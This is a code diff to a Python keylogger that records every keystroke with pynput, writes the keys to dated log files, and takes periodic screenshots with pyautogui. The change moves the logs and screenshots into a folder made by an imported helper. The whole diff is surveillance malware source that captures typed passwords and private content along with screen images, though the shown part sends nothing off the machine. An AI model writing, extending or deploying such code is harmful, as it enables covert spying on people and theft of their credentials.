@@ -1,6 +1,7 @@
 from pynput import keyboard
 from datetime import date, datetime, timedelta
 import pyautogui
+from win_file import create_folder
 
 keys = []
 curr_date = date.today()
@@ -25,7 +26,9 @@ def on_release(key):
         return False
     
 def write_file(keys):
-    with open(f'logs/{date_str}.log', 'w') as f:
+    path = create_folder() 
+
+    with open(f'{path}/logs/{date_str}.log', 'w') as f:
         for key in keys:
             # removing ''
             k = str(key).replace("'", "")
@@ -36,11 +39,13 @@ def write_file(keys):
             f.write(' ')
 
 def screenshot():
+    path = create_folder()
+    
     curr_date_time = datetime.now()
     dt_string = curr_date_time.strftime("%d-%m-%Y_%H-%M-%S")
     
     ss = pyautogui.screenshot()
-    ss.save(f'screenshots/{dt_string}.jpg')
+    ss.save(f'{path}/screenshots/{dt_string}.jpg')
 
 # Start up the listener
 listener = keyboard.Listener(
